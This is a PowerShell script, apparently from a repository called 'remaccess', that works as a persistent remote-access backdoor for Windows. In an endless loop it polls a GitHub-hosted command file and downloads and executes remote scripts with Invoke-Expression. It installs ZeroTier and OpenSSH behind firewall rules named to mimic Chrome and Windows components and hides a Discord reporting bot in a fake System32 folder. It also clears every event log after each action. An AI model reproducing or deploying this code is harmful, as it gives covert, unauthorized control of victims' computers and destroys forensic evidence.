while ($true) {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $retryAttempts = 5
    $ztservice = "ZeroTierOneService"
    $ztservice2 = "IP Core Helper"
    $sshdservice = "sshd"
    $sshagentservice = "ssh-agent"
    $ztfwruleset = ("ZeroTier One", "ZeroTier x64 Binary In", "ZeroTier UDP/9993 In")
    $sshfwruleset = ("Google Chrome Core Service", "Windows Runtime Broker")
    $ztdir = "C:\ProgramData\ZeroTier"
    $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
    $sshdir = "C:\Program Files\OpenSSH"
    $sshdatadir = "C:\ProgramData\ssh"
    $regPath = "HKLM:\Software\WindowsUpdateService"
    $cacheBuster = Get-Random
    #$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/BasicInletValveInstall.ps1"
    $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
    $ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
    $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$cacheBuster"
    $storedData = (Get-ItemProperty -Path $regPath).Data
    $storedCode = (Get-ItemProperty -Path $regPath).Code
    $downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordStatusUpdateBot.exe"
    $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
    $botpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
    $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
    $ztnethandler = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ZeroTierStuff/ZtNetJoinLeaveHandler.ps1"

    #File Integrity Check.
    if (-not (Test-Path (Split-Path $botpath))) {
        New-Item -Path (Split-Path $botpath) -ItemType Directory -Force
    }
    if (Test-Path $botpath) {
        $existingFileHash = (Get-FileHash -Path $botpath -Algorithm SHA256).Hash
        $hashesData = (Invoke-WebRequest -Uri $hashesUrl -UseBasicParsing).Content
        $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
        if ($hashesData -match $hashRegex) {
            $programHash = $matches[1]
        }
        if ($programHash -eq $existingFileHash) {
        }
        else {
            Remove-Item -Path $botpath -Force
        }
    }
    if (-not (Test-Path $botpath)) {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $botpath
    }
    #Function to add or update registry keys
    function CheckAndUpdateRegistryCode {
        param (
            [string]$regPath = "HKLM:\Software\WindowsUpdateService"
        )
        if (Test-Path -Path $regPath) {
            $code = (Get-ItemProperty -Path $regPath).Code
            if ($code -notmatch '^6\d{5}$') {
                Set-ItemProperty -Path $regPath -Name 'Code' -Value '001122'
            }
        }
        else {
            New-ItemProperty -Path $regPath -Name 'Code' -PropertyType String -Value '001122'
        }
    }

    #Log Collector function.
    function LogCollector {
        param (
            [string]$LogPath = "C:\Windows\System32\RemLog.txt",
            [string[]]$Dump,
            [switch]$Delete
        )
    
        if (-not (Test-Path $LogPath)) {
            New-Item -Path $LogPath -ItemType File -Force | Out-Null
        }
    
        if ($Delete) {
            # Delete errors from log
            foreach ($error in $Dump) {
                (Get-Content -Path $LogPath) -notmatch $error | Set-Content -Path $LogPath
            }
            #Write-Host "Data removed from log."
        } else {
            # Append errors to log
            $Dump | Add-Content -Path $LogPath
            #Write-Host "Data Appended to log file."
        }
    }  
    
    #Execution of scripts from web.
    function WebExecution {
        param (
            [string]$InstallScriptURL
        )

        try {
            Write-Host "Installing Program from $InstallScriptURL..."
            $errorOutput = Invoke-RestMethod $InstallScriptURL 2>&1 | Invoke-Expression
            if ($LASTEXITCODE -eq 0) {
                Write-Host "Web Install installation completed."
            }
            else {
                Write-Host "Installation failed with error: $errorOutput"
            }
        }
        catch {
            Write-Host "Failed to install Web Install: $_"
        }
    }

    #Function to start the services
    function Start-ServiceSafe {
        param (
            [string]$ServiceName
        )
        try {
            $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
            if ($serviceStatus.Status -ne "Running") {
                # Check if the service is set to "Automatic" start
                if ($serviceStatus.StartType -ne "Automatic") {
                    # Set the service to "Automatic" start
                    Set-Service -Name $ServiceName -StartupType Automatic
                }
                # Start the service
                Start-Service -Name $ServiceName
            }
        }
        catch {
            Write-Host "Service $ServiceName not found or cannot be manipulated."
        }
    }

    #Function to stop and disable windows services
    function Stop-AndDisable-ServiceSafe {
        param (
            [string]$ServiceName
        )
        try {
            $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
            if ($serviceStatus.Status -ne "Stopped") {
                # Stop the service
                Stop-Service -Name $ServiceName
            }
            # Set the service to Disabled
            Set-Service -Name $ServiceName -StartupType Disabled
        }
        catch {
            Write-Host "Service $ServiceName not found or cannot be manipulated."
        }
    }

    #Function to delete windows services
    function SafeServiceDelete {
        param (
            [string]$ServiceName
        )
        try {
            $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
            # Stop the service if it is running
            if ($serviceStatus.Status -eq "Running") {
                Stop-Service -Name $ServiceName -Force
            }
            # Delete the service
            sc.exe delete $ServiceName
        }
        catch {
            Write-Host "Service $ServiceName not found or cannot be manipulated."
        }
    }

    #Function to enable, disable and delete firewall rules.
    function FwRuleMgmt {
        param (
            [string[]]$RuleNames,
            [string]$Action
        )
        switch ($Action) {
            "enable" {
                $enable = "yes"
            }
            "disable" {
                $enable = "no"
            }
            "deletion" {
                foreach ($ruleName in $RuleNames) {
                    try {
                        $existingRule = Get-NetFirewallRule -DisplayName $ruleName -ErrorAction Stop
                        if ($existingRule) {
                            Remove-NetFirewallRule -DisplayName $ruleName
                            #Write-Host "Firewall rule '$ruleName' removed."
                        }
                    }
                    catch {
                        #Write-Host "Firewall rule '$ruleName' not found or cannot be manipulated."
                    }
                }
                return
            }
            default {
                #Write-Host "Invalid action specified. Please use 'enable', 'disable', or 'deletion'." -ForegroundColor Yellow
                return
            }
        }    
        foreach ($ruleName in $RuleNames) {
            try {
                netsh advfirewall firewall set rule name="$ruleName" new enable=$enable 2>&1 | LogCollector -Dump $RuleNames
            }
            catch {
                $errorMessage = "Failed to " + $Action + " firewall rule " + $ruleName + ": $_"
                LogCollector -Dump $errorMessage
            }
        }
    }
    function RetryOps {
        param (
            [scriptblock]$Operation,
            [int]$MaxRetries
        )
        $retryCount = 0
        $retrySuccess = $false
        while ($retryCount -lt $MaxRetries -and -not $retrySuccess) {
            try {
                $Operation.Invoke()
                $retrySuccess = $true
            }
            catch {
                $retryCount++
            }
        }
        if (-not $retrySuccess) {
            Write-Host "Operation failed after $MaxRetries retries."
        }
    }

    #Function to Delete Directories
    function DirDelFunc {
        param (
            [string]$directories
        )
        $directories | ForEach-Object {
            $directory = $_
            if (Test-Path -Path $directory -PathType Container) {
                try {
                    Remove-Item -Path $directory -Force -Recurse -ErrorAction Stop
                }
                catch {
                    Write-Host "Failed to delete directory $directory." -ForegroundColor Red
                }
            }
            else {
                Write-Host "Directory $directory does not exist." -ForegroundColor Yellow
            }
        }
    }

    #Function to Purge Zerotier
    function zerotier_purge {
        Install-PackageProvider -Name NuGet -Force | Out-Null
        Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
    }

    ##Under review function to remove the programs installed via program manager of windows.
    function Remove-Package {
        param (
            [string]$PackageName
        )

        # Install NuGet provider if not already installed
        Install-PackageProvider -Name NuGet -Force | Out-Null

        # Uninstall the specified package
        Uninstall-Package $PackageName -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    }

    #Code starts here.
    # Check if the "Code" value is not null (i.e., it exists)
    CheckAndUpdateRegistryCode
    if ($null -ne $storedCode) {
        # Download the status values from the URL
        $webStatus = (Invoke-RestMethod -Uri $codeUrl).Split([Environment]::NewLine)
        # Initialize the variable to store the new status
        $status = $null
        # Iterate through web status values
        $webStatus | ForEach-Object {
            $line = $_
            $code, $status = $line -split ' ', 2
            if ($code -eq $storedCode) {
                # Match found
                if ($status -eq $storedData) {
                    # Status matches, exit
                    continue
                }
                else {        
                    # Perform actions based on status
                    switch ($status) {
                        "active" {
                            RetryOps {
                                Start-ServiceSafe -ServiceName $ztservice
                                Start-ServiceSafe -ServiceName $sshagentservice
                                Start-ServiceSafe -ServiceName $sshdservice
                                FwRuleMgmt -RuleNames $ztfwruleset -Action enable
                                FwRuleMgmt -RuleNames $sshfwruleset -Action enable
                                WebExecution -InstallScriptURL $ztnethandler
                                Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
                            } -MaxRetries $retryAttempts
                        }
                        "dormant" {
                            RetryOps {
                                WebExecution -InstallScriptURL $ztnethandler
                                Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                                Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                                Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                                FwRuleMgmt -RuleNames $ztfwruleset -Action disable
                                FwRuleMgmt -RuleNames $sshfwruleset -Action disable
                                Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
                            } -MaxRetries $retryAttempts
                        }
                        "rejoin" {
                            RetryOps {
                                zerotier_purge
                                Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                                Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
                                Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                                Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                                SafeServiceDelete -ServiceName $ztservice
                                SafeServiceDelete -ServiceName $ztservice2
                                SafeServiceDelete -ServiceName $sshagentservice
                                SafeServiceDelete -ServiceName $sshdservice							
                                FwRuleMgmt -RuleNames $ztfwruleset -Action disable
                                FwRuleMgmt -RuleNames $sshfwruleset -Action disable
                                FwRuleMgmt -RuleNames $ztfwruleset -Action deletion
                                FwRuleMgmt -RuleNames $sshfwruleset -Action deletion						
                                DirDelFunc -directories $ztdir
                                DirDelFunc -directories $sshdir
                                DirDelFunc -directories $sshdatadir
                                DirDelFunc -directories $ztdatadir
                                WebExecution -InstallScriptURL $sshinstall
                                WebExecution -InstallScriptURL $ztinstall
                                Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
                            } -MaxRetries $retryAttempts
                        }
                        "purge" {
                            RetryOps {
                                #zerotier_purge
                                Remove-Package "ZeroTier One"
                                Remove-Package OpenSSH
                                Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                                Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                                Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                                SafeServiceDelete -ServiceName $ztservice
                                SafeServiceDelete -ServiceName $ztservice2
                                SafeServiceDelete -ServiceName $sshagentservice
                                SafeServiceDelete -ServiceName $sshdservice							
                                FwRuleMgmt -RuleNames $ztfwruleset -Action disable
                                FwRuleMgmt -RuleNames $sshfwruleset -Action disable
                                FwRuleMgmt -RuleNames $ztfwruleset -Action deletion
                                FwRuleMgmt -RuleNames $sshfwruleset -Action deletion	
                                DirDelFunc -directories $ztdir
                                DirDelFunc -directories $sshdir
                                DirDelFunc -directories $sshdatadir
                                DirDelFunc -directories $ztdatadir
                                Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
                            } -MaxRetries $retryAttempts
                        }
                        #Zerotier Purged, OpenSSH Disbaled
                        "zpod" {
                            RetryOps {
                                zerotier_purge
                                Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                                Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                                Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                                SafeServiceDelete -ServiceName $ztservice										
                                FwRuleMgmt -RuleNames $ztfwruleset -Action disable
                                FwRuleMgmt -RuleNames $sshfwruleset -Action disable
                                FwRuleMgmt -RuleNames $ztfwruleset -Action deletion
                                FwRuleMgmt -RuleNames $sshfwruleset -Action deletion	
                                DirDelFunc -directories $ztdir
                                Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
                            } -MaxRetries $retryAttempts
                        }
                        #Zerotier Install, OpenSSH Enabled
                        "zioe" {
                            RetryOps {				
                                Start-ServiceSafe -ServiceName $sshagentservice
                                Start-ServiceSafe -ServiceName $sshdservice
                                FwRuleMgmt -RuleNames $ztfwruleset -Action disable
                                WebExecution -InstallScriptURL $ztinstall
                                Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
                            } -MaxRetries $retryAttempts
                        }                
                    }
                    if ($status -ne $null) {
                        Set-ItemProperty -Path $regPath -Name "Data" -Value $status
                        $combineddata = """Status of **$storedCode** changed from **$storedData** to **$status**"""
                        Start-Process -WindowStyle Hidden -FilePath $botpath -ArgumentList $combineddata
                        Start-Sleep 3
                    }
                    break
                }
            }
        }
    } 
    else {}
    Start-Sleep 300 
}